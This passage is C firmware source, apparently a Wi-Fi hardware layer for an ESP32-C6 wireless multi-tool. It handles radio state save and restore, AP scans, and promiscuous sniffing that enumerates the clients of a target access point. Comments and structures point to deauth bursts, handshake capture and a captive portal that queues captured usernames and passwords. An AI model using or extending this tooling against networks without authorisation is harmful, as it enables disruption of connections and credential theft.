/* Clean-room implementation from MonstaTek contract, built against
 * official ESP-IDF v6.0.1 APIs (esp_wifi.h, esp_netif.h, esp_event.h).
 * Real radio-facing HAL for the ESP32-C6 target build -- see
 * docs/PROVENANCE.md: host-tested only; hardware behavior is not
 * validated here. */
#include "mtek_wifi_hal_esp32.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_log.h"
#include "esp_http_server.h"
#include "lwip/sockets.h"
#include "lwip/inet.h"
#include "freertos/queue.h"
#include <stdlib.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "freertos/semphr.h"
#include "freertos/queue.h"
#include <string.h>
#include <stdbool.h>

static const char *TAG = "mtk_wifi_hal";

static EventGroupHandle_t s_wifi_events;
#define WIFI_CONNECTED_BIT BIT0
#define WIFI_FAIL_BIT BIT1
/* Declared here (not down with the rest of the sta_scan session code) so
 * mtek_wifi_hal_esp32_init can create them -- see that function's own doc
 * comment and the sta_scan section below for the full design. */
static SemaphoreHandle_t s_sta_scan_mutex;
static EventGroupHandle_t s_sta_scan_events;
static esp_netif_t *s_sta_netif;
static esp_netif_t *s_ap_netif;

#define PORTAL_CRED_QUEUE_LEN 8
#define PORTAL_HTTP_BODY_MAX  512

typedef struct {
    uint8_t user[64]; uint8_t user_len;
    uint8_t pass[64]; uint8_t pass_len;
} portal_cred_msg_t;

static httpd_handle_t s_portal_httpd;
static TaskHandle_t s_portal_dns_task;
static volatile int s_portal_dns_run;
static QueueHandle_t s_portal_cred_queue;
static SemaphoreHandle_t s_portal_mutex;
static mtk_hal_portal_cred_cb_t s_portal_cb;
static void *s_portal_cb_user;
static uint32_t s_portal_dns_queries;
static uint32_t s_portal_http_hits;
static uint8_t s_portal_last_post[95];
static uint8_t s_portal_last_post_len;
static char s_portal_title[96];

static void portal_lock(void)   { if (s_portal_mutex) xSemaphoreTake(s_portal_mutex, portMAX_DELAY); }
static void portal_unlock(void) { if (s_portal_mutex) xSemaphoreGive(s_portal_mutex); }
static mtk_hal_frame_cb_t s_promisc_cb;
static void *s_promisc_user;
/* #2/#7: declared here (not down with promisc_trampoline/esp32_promisc_service)
 * so mtek_wifi_hal_esp32_ init can create them -- see promisc_trampoline's own
 * doc comment below for the full design (never touched by the Wi-Fi driver task
 * itself except the plain generation load; s_promisc_cb/user/generation are only
 * ever written/read under s_promisc_cb_mutex, from safe contexts). */
/* CAPTURE_START accepts snap_len up to 1000 bytes. Preserve that public contract
 * across the driver-task defer queue instead of truncating to 200. */
#define PROMISC_FRAME_MAX_LEN 1000
#define PROMISC_QUEUE_LEN 8
typedef struct {
    uint32_t generation;
    uint8_t data[PROMISC_FRAME_MAX_LEN];
    uint16_t len;
    int8_t rssi;
    uint8_t channel;
} promisc_frame_msg_t;
static QueueHandle_t s_promisc_queue;
static SemaphoreHandle_t s_promisc_cb_mutex;
static uint32_t s_promisc_generation;
/* RC11 promiscuous-mode audit follow-up #7 -- see promisc_trampoline's
 * own doc comment below on why this is a plain atomic, not mutex-guarded. */
static uint32_t s_promisc_queue_overflow_count;
/* Tracks whether the station was genuinely connected before a List B
 * operation borrowed the radio, independent of mtek_wifi_logic.c's own
 * s_sta_connected (that one reflects the CURRENT connection state and is
 * cleared the moment esp_wifi_set_mode/promiscuous toggles it; this one
 * is set only by a real successful esp32_connect and cleared only by an
 * explicit esp32_disconnect -- the exact "was there something to restore
 * to" signal esp32_restore_sta_mode needs). */
static uint8_t s_sta_was_connected;

/* esp32_restore_sta_mode used to hard-code WIFI_MODE_STA and never restore the
 * pre-session channel at all -- correct only by coincidence for the common case
 * (mode already STA, channel restored implicitly by a reconnect). A real prior
 * AP/ APSTA mode, or a session that never reconnects (station was not connected
 * before), silently got the wrong mode/channel back. Captured exactly ONCE per
 * borrowed-radio session (guarded by `valid`, cleared again at the end of
 * esp32_restore_sta_mode) -- capture_prior_state_once is called from every real
 * "disturb the radio" entry point (esp32_send_deauth, esp32_promisc_start,
 * esp32_set_channel) so a multi- step session (a deauth burst's repeated
 * per-packet channel selects, a capture's own channel-hop ticks) never
 * re-captures an already-disturbed state as if it were the original one. */
typedef struct { uint8_t valid; wifi_mode_t mode; uint8_t channel; uint8_t was_connected; bool promiscuous; } wifi_prior_state_t;
static wifi_prior_state_t s_prior_state;
/* A real TSan run (against the fake-HAL mirror of this exact call pattern,
 * mtk_fake_wifi_hal.h) caught a genuine race between an in-flight List B
 * worker's own capture_prior_state_once/set_channel calls and a concurrent
 * STOP's esp32_restore_sta_mode call on another FreeRTOS task -- both touch
 * s_prior_state (and the pre-existing s_sta_was_connected, itself never locked
 * before this fix either) unlocked. mtk_op_transition's own return-value
 * linearization guarantees only ONE side ever performs the actual
 * cleanup/restore, but says nothing about the LOSING side's own in-flight HAL
 * call (already past the linearization point, still executing) racing the
 * WINNING side's own restore -- a genuinely real hazard now that s_prior_state
 * exists, not something the arbiter/op-table locking already covered. */
static SemaphoreHandle_t s_prior_state_mutex;
/* RC11 promiscuous-mode audit follow-up #5 "check queue, mutex, event-
 * group, netif, and wifi_promisc_tick_task creation failures -- never
 * accept a capture if its required runtime resources are unavailable":
 * mtek_wifi_hal_esp32_init below sets this only if every FreeRTOS
 * primitive/netif it creates actually succeeded; capture_prior_state_
 * once (this HAL's own single choke point for every "disturb the radio"
 * entry -- ap_scan, sta_scan, send_deauth, promisc_start, set_channel)
 * refuses immediately when it is not set, so no caller ever reaches an
 * xSemaphoreTake/xQueueSend/etc against a NULL handle a failed
 * xSemaphoreCreateMutex/xQueueCreate/xEventGroupCreate would otherwise
 * leave behind (undefined behavior on real FreeRTOS, not a safe no-op). */
static uint8_t s_wifi_resources_ready;
/* Three real gaps fixed together -- (1) promiscuous state was never captured at
 * all, so esp32_restore_sta_mode had nothing to restore it to (it always
 * defensively forces promiscuous OFF regardless, which is only correct because
 * of gap (3) below); (2) a real esp_wifi_get_mode failure was silently ignored
 * -- s_prior_state.mode was left at whatever uninitialized/stale value it
 * already held, and `valid` was still set, so a caller would restore to UNKNOWN
 * state believing it was the real one; (3) esp_wifi_get_channel failure silently
 * substituted channel 0 (a real, meaningful "no fixed channel"/"first channel"
 * value on this HAL, not a safe placeholder). Now returns false (a real
 * transactional- entry failure -- callers must abort, never proceed) if ANY
 * required read fails, and NEVER sets `valid` around a partially/unknown-good
 * snapshot. The promiscuous read doubles as an invariant check: this HAL's own
 * design (capture_prior_state_once runs at most once per borrowed-radio session,
 * and every session's own restore turns promiscuous mode off again before
 * releasing the arbiter) means the radio must ALWAYS be non-promiscuous at the
 * moment a NEW session begins -- reading it as promiscuous here means some other
 * path left it on, an invariant violation this code refuses to silently paper
 * over by "restoring" a captured `true` (which would just re-arm whatever stale
 * promiscuous state already existed); it fails the entry instead. */
static bool capture_prior_state_once(void) {
    if (!s_wifi_resources_ready) {
        ESP_LOGE(TAG, "capture_prior_state_once: required runtime resources were not available at init "
                       "-- refusing to start any radio-disturbing session (ap_scan/sta_scan/deauth/"
                       "promiscuous capture/set_channel)");
        return false;
    }
    xSemaphoreTake(s_prior_state_mutex, portMAX_DELAY);
    if (s_prior_state.valid) { xSemaphoreGive(s_prior_state_mutex); return true; }
    wifi_mode_t mode;
    esp_err_t mode_err = esp_wifi_get_mode(&mode);
    uint8_t primary = 0; wifi_second_chan_t second;
    esp_err_t chan_err = esp_wifi_get_channel(&primary, &second);
    bool promisc = false;
    esp_err_t promisc_err = esp_wifi_get_promiscuous(&promisc);
    if (mode_err != ESP_OK || chan_err != ESP_OK || promisc_err != ESP_OK) {
        ESP_LOGE(TAG, "capture_prior_state_once: a required snapshot read failed (mode=%s channel=%s promiscuous=%s) -- "
                       "refusing to start a session over unknown prior radio state",
                 esp_err_to_name(mode_err), esp_err_to_name(chan_err), esp_err_to_name(promisc_err));
        xSemaphoreGive(s_prior_state_mutex);
        return false;
    }
    if (promisc) {
        ESP_LOGE(TAG, "capture_prior_state_once: invariant violation -- the radio is already promiscuous before "
                       "this session began (a prior session's own teardown may not have actually completed) -- "
                       "refusing to start a new session over unknown radio state");
        xSemaphoreGive(s_prior_state_mutex);
        return false;
    }
    s_prior_state.mode = mode;
    s_prior_state.channel = primary;
    s_prior_state.promiscuous = false; /* the invariant above: always non-promiscuous at capture time */
    s_prior_state.was_connected = s_sta_was_connected;
    s_prior_state.valid = 1;
    xSemaphoreGive(s_prior_state_mutex);
    /* The real, accepted policy (docs/DECISION_LOG.md's "explicit coexistence
     * policy" entry) is PLATFORM-WIDE MUTUAL EXCLUSION -- mtek_arbiter.h's own
     * single- active-class design means a live BLE session (advertising, an
     * active GATT connection, a scan) and a Wi-Fi List B session
     * (deauth/handshake/MonstaShark/raw TX) can NEVER both be genuinely active
     * at once; starting one while the other holds the arbiter is honestly
     * rejected BUSY, proven by test_wifi_prior_state_restore.c's own coexistence
     * section. This function's own warning below is about a DIFFERENT, narrower
     * risk that mutual exclusion does NOT cover: `STA_CONNECT` releases its own
     * arbiter class (MTK_ARB_WMC) immediately once the connection attempt
     * completes (mtek_wifi_logic.c's handle_sta_connect), so a station can be
     * marked `connected` while holding no ongoing lease at all -- a LATER,
     * independent Wi-Fi List B session can then legitimately acquire the
     * (genuinely free) arbiter and temporarily disrupt that connection. This is
     * real and possible, not a policy choice this code could avoid, so it is
     * made HONEST (logged plainly, every time) rather than left silent, and
     * esp32_restore_sta_mode's own reconnect afterward is what makes the
     * disruption temporary rather than permanent. */
    wifi_ap_record_t info;
    if (esp_wifi_sta_get_ap_info(&info) == ESP_OK) {
        ESP_LOGW(TAG, "capture_prior_state_once: a single-channel monitor/injection operation is starting while "
                       "the station is actively connected (channel %u) -- this WILL disrupt the association until "
                       "esp32_restore_sta_mode's own reconnect runs at session end", info.primary);
    }
    return true;
}

static void wifi_event_handler(void *arg, esp_event_base_t base, int32_t id, void *data) {
    (void)arg; (void)data;
    if (base == WIFI_EVENT && id == WIFI_EVENT_STA_DISCONNECTED) {
        if (s_wifi_events) xEventGroupSetBits(s_wifi_events, WIFI_FAIL_BIT);
    } else if (base == IP_EVENT && id == IP_EVENT_STA_GOT_IP) {
        if (s_wifi_events) xEventGroupSetBits(s_wifi_events, WIFI_CONNECTED_BIT);
    }
}

/* RC11 promiscuous-mode audit follow-up #5 "check queue, mutex, event- group,
 * netif, and wifi_promisc_tick_task creation failures": every FreeRTOS/esp_netif
 * allocation below is now checked -- a NULL result from any of them (heap
 * exhaustion at boot, in practice) leaves s_wifi_resources_ready cleared, which
 * capture_prior_state_once's own new gate (above) turns into an honest,
 * immediate refusal for every radio-disturbing opcode instead of an eventual
 * crash on a NULL FreeRTOS handle. Returns the same status to app_main.c so
 * app_main can log/act on it too (event handler registration failures are logged
 * but not fatal to this flag -- a missed STA_CONNECT/DISCONNECT event
 * notification degrades that one opcode's own timeout behavior, it does not
 * leave any handle capable of crashing a caller). Called once from app_main
 * before any HAL call, after esp_wifi_init. */
int mtek_wifi_hal_esp32_init(void) {
    int ok = 1;
    s_prior_state_mutex = xSemaphoreCreateMutex();
    if (!s_prior_state_mutex) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xSemaphoreCreateMutex(prior_state) failed"); ok = 0; }
    s_wifi_events = xEventGroupCreate();
    if (!s_wifi_events) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xEventGroupCreate(wifi_events) failed"); ok = 0; }
    s_sta_scan_mutex = xSemaphoreCreateMutex();
    if (!s_sta_scan_mutex) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xSemaphoreCreateMutex(sta_scan) failed"); ok = 0; }
    s_sta_scan_events = xEventGroupCreate();
    if (!s_sta_scan_events) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xEventGroupCreate(sta_scan) failed"); ok = 0; }
    s_promisc_cb_mutex = xSemaphoreCreateMutex();
    if (!s_promisc_cb_mutex) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xSemaphoreCreateMutex(promisc_cb) failed"); ok = 0; }
    s_promisc_queue = xQueueCreate(PROMISC_QUEUE_LEN, sizeof(promisc_frame_msg_t));
    if (!s_promisc_queue) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xQueueCreate(promisc_queue) failed"); ok = 0; }
    s_sta_netif = esp_netif_create_default_wifi_sta();
    if (!s_sta_netif) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: esp_netif_create_default_wifi_sta failed"); ok = 0; }
    /* The AP netif is created once here rather than per SOFTAP_START, because
     * esp_netif_create_default_wifi_ap is not idempotent: creating a second
     * default AP netif while one already exists aborts inside esp_netif. It
     * carries the AP-side DHCP server, which esp_netif starts automatically
     * when the interface comes up, and it costs nothing while no AP is
     * running. Its absence is not fatal to the rest of the HAL -- only the
     * SoftAP entry points refuse (see esp32_softap_start). */
    s_portal_mutex = xSemaphoreCreateMutex();
    if (!s_portal_mutex) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xSemaphoreCreateMutex(portal) failed -- captive portal will refuse"); }
    s_portal_cred_queue = xQueueCreate(PORTAL_CRED_QUEUE_LEN, sizeof(portal_cred_msg_t));
    if (!s_portal_cred_queue) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: xQueueCreate(portal) failed -- captive portal will refuse"); }
    s_ap_netif = esp_netif_create_default_wifi_ap();
    if (!s_ap_netif) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: esp_netif_create_default_wifi_ap failed -- SoftAP will refuse"); }
    /* A Wi-Fi/IP event-handler registration failure now makes HAL
     * init FAIL (ok=0), not merely log. Both handlers are load-bearing:
     * wifi_event_handler is what sets WIFI_CONNECTED_BIT/WIFI_FAIL_BIT in
     * s_wifi_events, which esp32_ connect's own xEventGroupWaitBits blocks on --
     * without the IP handler a genuine STA_CONNECT would never observe GOT_IP
     * and would always time out, and without the WIFI handler a disconnect/fail
     * is never signalled either. A HAL that cannot observe its own connection
     * outcome must report not-ready so app_main refuses to install it
     * (mtek_wifi_logic.c's `s_hal &&` guards then honestly refuse every Wi-Fi
     * opcode) rather than advertise a station path that can only ever hang. On
     * failure, whichever handler DID register is unwound so no live handler is
     * left bound to a HAL that will not be installed. */
    esp_err_t reg1 = esp_event_handler_register(WIFI_EVENT, ESP_EVENT_ANY_ID, wifi_event_handler, NULL);
    if (reg1 != ESP_OK) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: esp_event_handler_register(WIFI_EVENT) returned %s", esp_err_to_name(reg1)); ok = 0; }
    esp_err_t reg2 = esp_event_handler_register(IP_EVENT, IP_EVENT_STA_GOT_IP, wifi_event_handler, NULL);
    if (reg2 != ESP_OK) { ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: esp_event_handler_register(IP_EVENT) returned %s", esp_err_to_name(reg2)); ok = 0; }
    if (reg1 != ESP_OK || reg2 != ESP_OK) {
        if (reg1 == ESP_OK) esp_event_handler_unregister(WIFI_EVENT, ESP_EVENT_ANY_ID, wifi_event_handler);
        if (reg2 == ESP_OK) esp_event_handler_unregister(IP_EVENT, IP_EVENT_STA_GOT_IP, wifi_event_handler);
    }
    s_wifi_resources_ready = (uint8_t)ok;
    if (!ok) {
        ESP_LOGE(TAG, "mtek_wifi_hal_esp32_init: one or more required runtime resources failed to allocate "
                       "-- every radio-disturbing opcode (AP/station-target scan, deauth, handshake capture, "
                       "MonstaShark capture, raw TX channel select) will be refused rather than risk operating "
                       "on an unusable synchronization primitive");
    }
    return ok ? 0 : -1;
}

static uint8_t map_authmode(wifi_auth_mode_t m) {
    switch (m) {
        case WIFI_AUTH_OPEN: return 0;
        case WIFI_AUTH_WEP: return 1;
        case WIFI_AUTH_WPA_PSK: return 2;
        case WIFI_AUTH_WPA2_PSK: return 3;
        case WIFI_AUTH_WPA_WPA2_PSK: return 4;
        case WIFI_AUTH_WPA2_ENTERPRISE: return 5;
        case WIFI_AUTH_WPA3_PSK: return 6;
        case WIFI_AUTH_WPA2_WPA3_PSK: return 7;
        default: return 255;
    }
}

/* esp_wifi_get_mode/set_mode/start's own return values were previously discarded
 * entirely -- a real failure here (e.g. set_mode rejected, or start failing to
 * bring the radio up) previously fell through into esp_wifi_scan_start anyway,
 * which could itself return an unrelated-looking error or, worse, "succeed"
 * against a driver that never actually started, turning a real target failure
 * into a misleading result. Every step is now checked and logged; a get_mode
 * failure is non-fatal (falls back to the existing "not already STA/APSTA"
 * assumption, matching the prior default behavior exactly since the true mode is
 * unknown either way), but a set_mode or start failure now aborts before ever
 * attempting a scan against an unconfirmed driver state -- no command ID, wire
 * format, or accepted timing behavior changes; only a genuine failure is now
 * reported honestly instead of silently proceeding. */
/* esp_wifi_scan_stop is the real ESP-IDF cancellation primitive for a scan
 * blocked inside esp_wifi_scan_start(..., true) on another task -- calling it
 * makes that blocked call return (the ONLY safe way to interrupt it; there is no
 * cancel-flag/poll-loop design here the way sta_scan has one, because ap_scan's
 * own single blocking call has no intermediate points to poll at all). */
static void esp32_ap_scan_cancel(void) {
    esp_err_t err = esp_wifi_scan_stop();
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_ap_scan_cancel: esp_wifi_scan_stop returned %s", esp_err_to_name(err));
    }
}

static int esp32_ap_scan(uint8_t band, uint8_t fixed_channel, uint32_t duration_ms,
                          mtk_hal_ap_record_t *out, unsigned max_out) {
    (void)band; (void)duration_ms;
    /* #6: capture_prior_state_once was missing here entirely -- AP scan never
     * restored the prior mode/channel afterward at all (mtek_wifi_logic.c's own
     * handle_ap_ scan_start never called restore_sta_mode either, a matching gap
     * fixed there). */
    if (!capture_prior_state_once()) return -1;
    wifi_mode_t prev_mode = WIFI_MODE_STA;
    esp_err_t mode_get_err = esp_wifi_get_mode(&prev_mode);
    if (mode_get_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_ap_scan: esp_wifi_get_mode returned %s", esp_err_to_name(mode_get_err));
        return -1;
    }
    if (prev_mode != WIFI_MODE_STA && prev_mode != WIFI_MODE_APSTA) {
        esp_err_t mode_set_err = esp_wifi_set_mode(WIFI_MODE_STA);
        if (mode_set_err != ESP_OK) {
            ESP_LOGE(TAG, "esp32_ap_scan: esp_wifi_set_mode(STA) returned %s", esp_err_to_name(mode_set_err));
            return -1;
        }
    }
    esp_err_t start_err = esp_wifi_start();
    if (start_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_ap_scan: esp_wifi_start returned %s", esp_err_to_name(start_err));
        return -1;
    }

    wifi_scan_config_t cfg = { .channel = fixed_channel, .show_hidden = true };
    if (esp_wifi_scan_start(&cfg, true) != ESP_OK) return -1;

    static wifi_ap_record_t recs[50];
    uint16_t num = max_out > 50 ? 50 : (uint16_t)max_out;
    if (esp_wifi_scan_get_ap_records(&num, recs) != ESP_OK) return -1;
    for (unsigned i = 0; i < num; i++) {
        memcpy(out[i].bssid.b, recs[i].bssid, 6);
        size_t slen = strnlen((const char *)recs[i].ssid, 32);
        memcpy(out[i].ssid, recs[i].ssid, slen);
        out[i].ssid_len = (uint8_t)slen;
        out[i].channel = recs[i].primary;
        out[i].rssi = recs[i].rssi;
        out[i].authmode = map_authmode(recs[i].authmode);
    }
    return num;
}

/* The prior design used a `volatile bool` cancel flag and a naked global pointer
 * to a STACK-resident context, both read/written across the scan-owning task and
 * the real ESP Wi-Fi driver task (which invokes `sta_scan_promisc_cb` in ITS OWN
 * task context -- confirmed by ESP-IDF's own documented behavior for
 * `esp_wifi_set_promiscuous_rx_cb`: the callback runs on the Wi-Fi driver's
 * internal task, never an ISR, so a short, non-blocking-for- long FreeRTOS mutex
 * IS callback-safe here -- this is not an ISR context that would forbid it).
 * Replaced with: - a file-static (never stack) session struct, so a stray
 * callback invocation can never touch memory whose owning stack frame has
 * already returned; - a real mutex (`s_sta_scan_mutex`) guarding every
 * read/write of the session's shared fields (`active`/`count`/`results[]`),
 * taken briefly by both the callback and the owning task -- never held across a
 * blocking wait; - a FreeRTOS event group (`s_sta_scan_events`, mirroring this
 * file's own established `s_wifi_events` pattern) for the cancel signal,
 * replacing the bare `volatile bool`. Quiescence (no callback can still be in
 * flight or fire again) is established by construction, not by a delay-based
 * assumption: `esp_wifi_set_promiscuous_rx_cb`/`esp_wifi_set_promiscuous` are
 * synchronous ESP-IDF calls that post a command to the Wi-Fi driver's own
 * internal task and block until THAT task has processed it; since the same
 * internal task both processes these commands AND invokes the RX callback
 * (serially, one at a time, never concurrently with itself), a callback
 * invocation already in flight when `esp_wifi_set_promiscuous(false)` is called
 * must complete (or never have been dispatched) before that disable command is
 * itself processed, and no NEW invocation can be dispatched once it returns. The
 * mutex is defense in depth on top of this real API-level guarantee -- not a
 * substitute for it, and not exclusively relied upon alone. */
/* Matches WIFI_MAX_STA (mtek_wifi_logic.c) -- the caller never requests
 * more than that many results anyway; a static bound here keeps the
 * session struct itself statically sized rather than caller-sized. */
#define MTK_STA_SCAN_SESSION_MAX 32
typedef struct {
    uint8_t active;
    mtk_hal_mac6_t target;
    mtk_hal_station_record_t results[MTK_STA_SCAN_SESSION_MAX];
    unsigned max_out, count;
} sta_scan_session_t;
static sta_scan_session_t s_sta_scan_session; /* static storage -- never the scan-owning task's own stack */
#define STA_SCAN_CANCEL_BIT BIT0

static void esp32_sta_scan_cancel(void) {
    if (s_sta_scan_events) xEventGroupSetBits(s_sta_scan_events, STA_SCAN_CANCEL_BIT);
}

static void sta_scan_promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload;
    const uint8_t *addr1 = p + 4, *addr2 = p + 10, *addr3 = p + 16;
    /* Brief, bounded wait (never portMAX_DELAY from a callback this file
     * cannot fully control the scheduling latency of) -- if the owning
     * task happens to hold the lock for longer than this, the frame is
     * simply dropped, matching this codebase's own established "drop
     * rather than risk stalling the Wi-Fi driver task" posture elsewhere
     * (e.g. the GATT notify queue's own bounded-drop behavior). */
    if (xSemaphoreTake(s_sta_scan_mutex, pdMS_TO_TICKS(20)) != pdTRUE) return;
    if (!s_sta_scan_session.active) { xSemaphoreGive(s_sta_scan_mutex); return; }
    const uint8_t *station = NULL;
    if (memcmp(addr1, s_sta_scan_session.target.b, 6) == 0) station = addr2;
    else if (memcmp(addr2, s_sta_scan_session.target.b, 6) == 0) station = addr1;
    else if (memcmp(addr3, s_sta_scan_session.target.b, 6) == 0) station = addr2;
    if (station) {
        uint8_t dup = 0;
        for (unsigned i = 0; i < s_sta_scan_session.count; i++) {
            if (memcmp(s_sta_scan_session.results[i].mac.b, station, 6) == 0) { dup = 1; break; }
        }
        if (!dup && s_sta_scan_session.count < s_sta_scan_session.max_out) {
            memcpy(s_sta_scan_session.results[s_sta_scan_session.count].mac.b, station, 6);
            s_sta_scan_session.results[s_sta_scan_session.count].rssi = pkt->rx_ctrl.rssi;
            s_sta_scan_session.count++;
        }
    }
    xSemaphoreGive(s_sta_scan_mutex);
}

/* + P0 "restore is not actually failure- atomic": returns -1 for EITHER a
 * transactional-entry failure (the original RC9 contract) OR a teardown failure
 * (callback unregister/ promiscuous-disable) -- the caller must never treat a
 * scan whose own teardown could not be confirmed as a healthy, radio-safe
 * completion, regardless of how many stations were validly found before that
 * point. */
static int esp32_sta_scan(mtk_hal_mac6_t bssid, uint8_t channel, uint16_t duration_ms,
                           mtk_hal_station_record_t *out, unsigned max_out) {
    if (!capture_prior_state_once()) return -1; /* a required snapshot read failed -- never proceed over unknown prior state */
    if (max_out > MTK_STA_SCAN_SESSION_MAX) max_out = MTK_STA_SCAN_SESSION_MAX;
    xEventGroupClearBits(s_sta_scan_events, STA_SCAN_CANCEL_BIT);

    xSemaphoreTake(s_sta_scan_mutex, portMAX_DELAY);
    memset(&s_sta_scan_session, 0, sizeof(s_sta_scan_session));
    s_sta_scan_session.target = bssid;
    s_sta_scan_session.max_out = max_out;
    s_sta_scan_session.active = 1;
    xSemaphoreGive(s_sta_scan_mutex);

    /* Transactional entry: every real step's return value is checked and
     * a partial failure is unwound -- mirrors esp32_promisc_start's own
     * established pattern exactly. */
    esp_err_t cb_err = esp_wifi_set_promiscuous_rx_cb(sta_scan_promisc_cb);
    if (cb_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_sta_scan: esp_wifi_set_promiscuous_rx_cb returned %s", esp_err_to_name(cb_err));
        xSemaphoreTake(s_sta_scan_mutex, portMAX_DELAY);
        s_sta_scan_session.active = 0;
        xSemaphoreGive(s_sta_scan_mutex);
        return -1;
    }
    esp_err_t chan_err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (chan_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_sta_scan: esp_wifi_set_channel(%u) returned %s -- unwinding", channel, esp_err_to_name(chan_err));
        xSemaphoreTake(s_sta_scan_mutex, portMAX_DELAY);
        s_sta_scan_session.active = 0;
        xSemaphoreGive(s_sta_scan_mutex);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        return -1;
    }
    esp_err_t promisc_err = esp_wifi_set_promiscuous(true);
    if (promisc_err != ESP_OK) {
        ESP_LOGW(TAG, "esp32_sta_scan: esp_wifi_set_promiscuous(true) returned %s -- unwinding", esp_err_to_name(promisc_err));
        xSemaphoreTake(s_sta_scan_mutex, portMAX_DELAY);
        s_sta_scan_session.active = 0;
        xSemaphoreGive(s_sta_scan_mutex);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_set_promiscuous(false); /* defensive: leave no ambiguity about whether promiscuous mode is actually active */
        return -1;
    }

    /* Waits in short, bounded (100ms) polls instead of one long
     * uninterruptible vTaskDelay(duration_ms) -- checked against the
     * event-group cancel bit between each one, so a concurrent STOP (on
     * another task) makes this call return within one poll interval
     * instead of up to the full requested duration. */
    uint32_t remaining_ms = duration_ms ? duration_ms : 5000;
    const uint32_t poll_ms = 100;
    while (remaining_ms > 0) {
        uint32_t step = remaining_ms < poll_ms ? remaining_ms : poll_ms;
        EventBits_t bits = xEventGroupWaitBits(s_sta_scan_events, STA_SCAN_CANCEL_BIT, pdFALSE, pdFALSE, pdMS_TO_TICKS(step));
        remaining_ms -= step;
        if (bits & STA_SCAN_CANCEL_BIT) break;
    }

    /* Teardown -- both steps' return values are now checked. A teardown failure
     * means this call itself fails, regardless of how many stations were already
     * found; mtek_wifi_logic.c must never report a clean scan completion when
     * this HAL cannot confirm the radio was actually torn down safely. */
    esp_err_t promisc_off_err = esp_wifi_set_promiscuous(false);
    esp_err_t cb_clear_err = esp_wifi_set_promiscuous_rx_cb(NULL);
    /* Quiescence point: by here, both synchronous ESP-IDF calls above have
     * returned, which (per this function's own top doc comment) means the Wi-Fi
     * driver task has fully processed both commands and cannot deliver another
     * callback invocation for -- safe to invalidate `active` now. */
    xSemaphoreTake(s_sta_scan_mutex, portMAX_DELAY);
    s_sta_scan_session.active = 0;
    unsigned found = s_sta_scan_session.count;
    if (found > max_out) found = max_out;
    if (out && found) memcpy(out, s_sta_scan_session.results, found * sizeof(*out));
    xSemaphoreGive(s_sta_scan_mutex);

    if (promisc_off_err != ESP_OK || cb_clear_err != ESP_OK) {
        ESP_LOGE(TAG, "esp32_sta_scan: teardown unconfirmed (promiscuous_off=%s, cb_clear=%s) -- reporting failure "
                       "even though %u station(s) were found before this point",
                 esp_err_to_name(promisc_off_err), esp_err_to_name(cb_clear_err), found);
        return -1;
    }
    return (int)found;
}

static int esp32_connect(const uint8_t *ssid, uint8_t ssid_len, mtk_hal_mac6_t bssid_hint, uint8_t channel_hint,
                          uint8_t auth_mode, const uint8_t *psk, uint8_t psk_len, uint8_t ip_mode,
                          mtk_hal_ipv4_t static_ip, mtk_hal_ipv4_t static_netmask, mtk_hal_ipv4_t static_gateway,
                          uint32_t timeout_ms, mtk_hal_connect_result_t *out) {
    (void)auth_mode;
    memset(out, 0, sizeof(*out));
    wifi_config_t cfg = {0};
    memcpy(cfg.sta.ssid, ssid, ssid_len);
    if (psk_len) memcpy(cfg.sta.password, psk, psk_len);
    cfg.sta.scan_method = WIFI_ALL_CHANNEL_SCAN;
    cfg.sta.sort_method = WIFI_CONNECT_AP_BY_SIGNAL;
    if (channel_hint) cfg.sta.channel = channel_hint;
    if (bssid_hint.b[0] || bssid_hint.b[1] || bssid_hint.b[2] || bssid_hint.b[3] || bssid_hint.b[4] || bssid_hint.b[5]) {
        cfg.sta.bssid_set = true;
        memcpy(cfg.sta.bssid, bssid_hint.b, 6);
    }

    /* Every one of these calls' own return values was previously discarded.
     * DHCP/static-IP setup failures are logged but not fatal to the connection
     * attempt itself (a real target may still associate at L2 even if IP
     * configuration needs a retry) -- but set_mode/set_config/start are genuine
     * preconditions for esp_wifi_connect to mean anything, so a failure there
     * now aborts before ever attempting to connect against an unconfirmed
     * driver/config state. */
    if (ip_mode == 1 /* STATIC */) {
        esp_err_t dhcp_stop_err = esp_netif_dhcpc_stop(s_sta_netif);
        if (dhcp_stop_err != ESP_OK && dhcp_stop_err != ESP_ERR_ESP_NETIF_DHCP_ALREADY_STOPPED) {
            ESP_LOGW(TAG, "esp32_connect: esp_netif_dhcpc_stop returned %s", esp_err_to_name(dhcp_stop_err));
        }
        esp_netif_ip_info_t ip_info = {0};
        memcpy(&ip_info.ip, static_ip.b, 4);
        memcpy(&ip_info.netmask, static_netmask.b, 4);
        memcpy(&ip_info.gw, static_gateway.b, 4);
        esp_err_t ip_set_err = esp_netif_set_ip_info(s_sta_netif, &ip_info);
        if (ip_set_err != ESP_OK) {
            ESP_LOGW(TAG, "esp32_connect: esp_netif_set_ip_info returned %s", esp_err_to_name(ip_set_err));
        }
    } else {
